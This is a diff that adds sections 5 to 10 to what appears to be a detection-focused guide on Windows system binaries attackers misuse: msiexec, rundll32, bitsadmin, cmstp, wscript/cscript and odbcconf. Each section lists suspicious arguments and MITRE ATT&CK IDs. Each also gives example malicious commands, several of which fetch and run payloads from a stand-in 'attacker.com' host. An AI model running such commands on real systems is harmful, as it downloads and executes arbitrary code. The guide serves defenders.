@@ -111,3 +111,116 @@ Note: the PowerShell spawns from WmiPrvSE.exe, not the original attacker process
  
 ---
 
+## 5. msiexec.exe
+ 
+**Legitimate purpose:** Windows Installer — installs, updates, and removes software packages (.msi files). Every software install on Windows uses this.
+ 
+**How attackers abuse it:** Install malicious packages from URLs or execute arbitrary DLLs. msiexec can download and run .msi files directly from the internet, and since it's the standard installer, network activity from msiexec is often trusted.
+ 
+**Malicious commands:**
+```cmd
+msiexec.exe /q /i http://attacker.com/payload.msi
+msiexec.exe /y malicious.dll
+```
+ 
+**Suspicious arguments:** `/i` pointing to a URL, `/y` or `/z` flags (register/unregister DLL), `/q` (quiet mode — no UI)
+ 
+**MITRE ATT&CK:** T1218.007 — System Binary Proxy Execution: Msiexec
+ 
+---
+ 
+## 6. rundll32.exe
+ 
+**Legitimate purpose:** Runs DLL files by calling a specific exported function. Windows itself uses this constantly for built-in functionality.
+ 
+**How attackers abuse it:** Execute malicious DLLs, load JavaScript from .dll files, or call functions from legitimate DLLs in unintended ways to execute code.
+ 
+**Malicious command:**
+```cmd
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject(""WScript.Shell"");w.run(""calc"");window.close()")
+rundll32.exe shell32.dll,ShellExec_RunDLL http://attacker.com/payload.exe
+```
+ 
+**Suspicious arguments:** javascript: protocol, URLs as arguments, unusual DLL paths or function names
+ 
+**MITRE ATT&CK:** T1218.011 — System Binary Proxy Execution: Rundll32
+ 
+---
+ 
+## 7. bitsadmin.exe
+ 
+**Legitimate purpose:** Background Intelligent Transfer Service Admin — manages file transfers in the background. Windows Update uses BITS to download updates without affecting network performance.
+ 
+**How attackers abuse it:** Download malicious files silently in the background. BITS transfers persist across reboots and can be scheduled — attackers use it for stealthy download and persistence.
+ 
+**Malicious command:**
+```cmd
+bitsadmin.exe /transfer job1 http://attacker.com/payload.exe C:\Temp\payload.exe
+bitsadmin.exe /create job1 && bitsadmin.exe /addfile job1 http://attacker.com/payload.exe C:\Temp\payload.exe && bitsadmin.exe /resume job1
+```
+ 
+**Suspicious arguments:** `/transfer` or `/addfile` pointing to external URLs, destination in Temp or AppData
+ 
+**MITRE ATT&CK:** T1197 — BITS Jobs
+ 
+---
+ 
+## 8. cmstp.exe
+ 
+**Legitimate purpose:** Microsoft Connection Manager Profile Installer — installs network connection manager profiles. Rarely used in modern environments.
+ 
+**How attackers abuse it:** Execute arbitrary code via malicious INF files. Can also bypass UAC on older Windows versions.
+ 
+**Malicious command:**
+```cmd
+cmstp.exe /ns /s malicious.inf
+```
+ 
+**Suspicious arguments:** Any .inf file from an unusual location, `/ns` flag (no setup wizard)
+ 
+**MITRE ATT&CK:** T1218.003 — System Binary Proxy Execution: CMSTP
+ 
+---
+ 
+## 9. wscript.exe / cscript.exe
+ 
+**Legitimate purpose:** Windows Script Host — runs VBScript and JScript files. wscript.exe runs scripts with a GUI, cscript.exe runs them in the command line.
+ 
+**How attackers abuse it:** Execute malicious VBScript or JScript files. Often used in phishing — the malicious attachment is a `.vbs` or `.js` file that runs through wscript.
+ 
+**Malicious command:**
+```cmd
+wscript.exe malicious.vbs
+cscript.exe //E:jscript malicious.txt
+```
+ 
+**Suspicious arguments:** Any script file from Downloads, Temp, or AppData; `//E:` flag used to specify script engine for non-standard extensions
+ 
+**Expected process tree (malicious):**
+```
+explorer.exe (user double-clicked the attachment)
+  └── wscript.exe malicious.vbs
+        └── cmd.exe or powershell.exe [payload]
+```
+ 
+**MITRE ATT&CK:** T1059.005 — Command and Scripting Interpreter: Visual Basic
+ 
+---
+ 
+## 10. odbcconf.exe
+ 
+**Legitimate purpose:** ODBC Configuration utility — configures ODBC (database) data sources on Windows.
+ 
+**How attackers abuse it:** Execute DLL files through the `/A` flag with the `REGSVR` action — similar to regsvr32 abuse but less monitored.
+ 
+**Malicious command:**
+```cmd
+odbcconf.exe /A {REGSVR malicious.dll}
+```
+ 
+**Suspicious arguments:** `/A {REGSVR ...}` pointing to a non-standard DLL path, especially from Temp or AppData
+ 
+**MITRE ATT&CK:** T1218.008 — System Binary Proxy Execution: Odbcconf
+ 
+---
+
